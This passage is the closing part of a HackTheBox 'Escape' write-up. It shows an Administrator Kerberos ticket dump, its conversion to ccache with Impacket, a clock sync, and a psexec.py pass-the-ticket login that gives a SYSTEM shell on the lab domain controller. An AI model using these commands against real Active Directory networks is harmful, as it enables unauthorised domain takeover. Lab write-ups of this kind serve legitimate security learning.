      utEpwalu84OyvxQNaQ90ffX0MxenRZQrN7DXDOAtFFglz9GLM8aXFdBQvxc8Amz7jCv4Gf0VnfBqJ70r
      dEpOIlyKTXQVMm7aivwfpi8A+a3EpGq46xpOQN/NUGz0CAwI5EdMrVIe43sS4gi0QiRcewHr6VGBu/fo
      6i+egJSnAJQJVbirc1935wOTDtFb570xnIGSGAbeUxJv0fZ5jODVKIJLE2B3ZHDLIg4Y1Nug41DANX2D
      LHskAKYAxONdrWdrMJQ3Adp2LcASMcNnXFLD8INwlOVR3WhtaKFfTMamOH28dPk9RAj6FL/6s2wpzl2O
      4PHnb+dkXsKe+yoKQvTWW9jBkWsGtt6zdi75o1MNP50II8v45jk5mk+4mlYsxfhwxuhVAcenHDzItSqR
      WFKO20c00aMhJ2ANENeIN8ipQiKHAsD/Q8Wn6YNsuj7r5iYReO9rdpLW2Y00/nwC2NmOvRblE7F43ycH
      dcAu9e1EBX5l8KAD07HJoGEmUu9rcTMZshYRap3gl5GhXuzR7z1bzmjR2UMnJrfz9XqT4j/8zbn/aaPT
      Ndv4GWQcR6kDLusJd9IrRyz7Z7sQ5uh20b+5tcR2Wox8Pt4fP6/CEfjxWuWh6yRpOSCoYGQ0cPEL38ka
      5Ep8MOpSVFiWPuKFJBS4ZjTIj2wIOPFWf76+MwEWhAEMSwusb3bvLFH8F01Zz2tGjPNrimkZVAHLsp0K
      xkLoePMPUIQQ4PKcrZnAnGi05x1Xxbv12197fshheiA2UVnB9WEhhWCNOpIiJnw4BKH197LiwoInHEv0
      wqYAunBmiQQ34boSUWeDzbSoqpIo5TW4Zoimybnvrbxrp1oblGXJKaaGnlnYJ2lDAhS8ctcbZTT5EI1u
      xpwfeKgZnQHHn7cJx5feFqOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE
      EMFgAzwt95mYsHXQPvKxzWKhDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAADhAAClERgPMjAyMzA2MTYxNzM2MDFaphEYDzIwMjMwNjE3MDMzNjAxWqcRGA8yMDIzMDYyMzE3
      MzYwMVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName           :  krbtgt/sequel.htb
  ServiceRealm          :  SEQUEL.HTB
  UserName              :  Administrator
  UserRealm             :  SEQUEL.HTB
  StartTime             :  6/16/2023 10:36:01 AM
  EndTime               :  6/16/2023 8:36:01 PM
  RenewTill             :  6/23/2023 10:36:01 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable
  KeyType               :  rc4_hmac
  Base64(key)           :  wWADPC33mZiwddA+8rHNYg==

*Evil-WinRM* PS C:\programdata>
```

Success! We now have a TGT as `Administrator`. This is of course in `kirbi` format (and base64 encoded) so if we want to use it from our Kali machine, we have to convert it to `ccache`. We can use Impacket [ticketConverter.py](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) to do so.

#### Step 4 - Transform the Ticket From KIRBI to CCACHE format

```bash
➜  Escape cat ticket.kirbi.b64 | base64 -d > ticket.kirbi
➜  Escape python3 ticketConverter.py ticket.kirbi ticket.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
➜  Escape
```

#### Step 5 Run psexec

Looks like we have everything we need. Let's use Impacket `psexec.py` to get a shell as `Administrator`.

```bash
➜  Escape KRB5CCNAME=ticket.ccache python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip 10.10.11.202 sequel.htb/administrator@dc.sequel.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Oops! We get a error. We don't have to worry since this was expected. Since we are dealing with active directory, time is a very sensitive issue for the DC. We have to sync our time with the DC. We can use following command to do so.

```bash
➜  Escape sudo ntpdate dc.sequel.htb
2023-06-16 19:45:29.147201 (+0200) -0.000088 +/- 0.018286 dc.sequel.htb 10.10.11.202 s1 no-leap
```

We can now re-run the `psexec.py` command and get a shell as `Administrator`.

```bash
➜  Escape KRB5CCNAME=ticket.ccache python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip 10.10.11.202 sequel.htb/administrator@dc.sequel.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.sequel.htb.....
[*] Found writable share ADMIN$
[*] Uploading file evWzjprY.exe
[*] Opening SVCManager on dc.sequel.htb.....
[*] Creating service jRpW on dc.sequel.htb.....
[*] Starting service jRpW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami && type C:\Users\Administrator\Desktop\root.txt
nt authority\system
e2524c**************************

C:\Windows\system32>
```

## Final thoughts

This was a very fun box. I always like when there are Windows machines on HackTheBox, because, frankly, they are always a bit our of my comfort zone. I really hope you liked my writeup for this machine and I'll see you in the next one. Thanks!
